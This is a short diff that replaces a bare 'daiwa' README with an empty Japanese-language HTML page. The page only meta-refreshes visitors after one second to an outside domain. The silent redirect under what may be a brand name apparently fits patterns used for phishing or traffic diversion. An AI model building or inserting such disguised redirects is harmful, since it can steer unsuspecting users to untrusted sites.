@@ -1,1 +1,20 @@
-# daiwa
+<!-- index.html -->
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+
+  <meta http-equiv="refresh" content="1;url=https://12378ia.com/dahe">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f5f5f5;
+      text-align: center;
+      margin-top: 20%;
+    }
+  </style>
+</head>
+<body>
+
+</body>
+</html>
